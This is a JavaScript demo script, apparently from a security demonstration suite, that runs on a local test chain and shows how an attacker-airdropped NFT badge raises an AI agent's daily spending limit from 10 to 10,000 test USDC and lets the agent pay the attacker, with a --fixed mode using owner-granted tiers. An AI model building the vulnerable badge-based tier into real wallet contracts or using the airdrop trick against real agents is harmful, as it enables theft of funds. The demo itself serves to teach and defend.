// Attack #2: permissions that grow from what lands in the wallet (the Bankr NFT pattern).
//   node demos/02-badge.mjs           an airdropped badge raises the daily limit 1,000x
//   node demos/02-badge.mjs --fixed   the tier is owner-granted: an airdrop changes nothing
import { startChain, stopChain, deploy, roles, abis, send, attempt, read, fmt, parseUnits } from "../lib/chain.mjs";
import { session } from "../lib/term.mjs";

const fixed = process.argv.includes("--fixed");
const t = session(fixed ? "badge-fixed" : "badge", fixed ? "Badge airdrop, fixed" : "Badge airdrop");
await startChain();
const u = (n) => parseUnits(String(n), 6);
const usdc = await deploy("usdc");
const badge = await deploy("badge");
const tier = fixed ? await deploy("tierFixed", [usdc]) : await deploy("tier", [usdc, badge]);
const tierAbi = fixed ? abis.tierFixed : abis.tier;
await send(roles.owner, usdc, abis.usdc, "mint", [tier, u(1_000_000)]); // fund the spend contract
// The fixed tier reverts dailyLimit() for a non-granted agent; that reverting IS the base tier (10).
const limit = () => read(tier, tierAbi, "dailyLimit", [roles.agent.address]).catch(() => u(10));

t.note(`daily limit for the agent: ${fmt(await limit())} tUSDC`);
t.cmd("badge.airdrop(agent)   # attacker airdrops a badge NFT");
await send(roles.attacker, badge, abis.badge, "airdrop", [roles.agent.address]);
t.warn(`agent now holds ${await read(badge, abis.badge, "balanceOf", [roles.agent.address])} badge NFT`);
t.note(`daily limit now: ${fmt(await limit())} tUSDC`);

t.cmd("tier.spend(attacker, 5,000 tUSDC)   # agent spends on that limit");
const r = await attempt(roles.agent, tier, tierAbi, "spend", [roles.attacker.address, u(5_000)]);
const moved = await read(usdc, abis.usdc, "balanceOf", [roles.attacker.address]);
if (r.ok) t.bad(`  ✓ moved ${fmt(moved)} tUSDC on an airdropped limit`);
else t.ok(`  ✗ reverted: ${r.name}  (badge not owner-granted)`);
t.big(fixed ? "TIER UNCHANGED: limit 10 tUSDC" : `LIMIT 10 → 10,000: spent ${fmt(moved)} tUSDC`);
t.save(); stopChain(); process.exit(0);
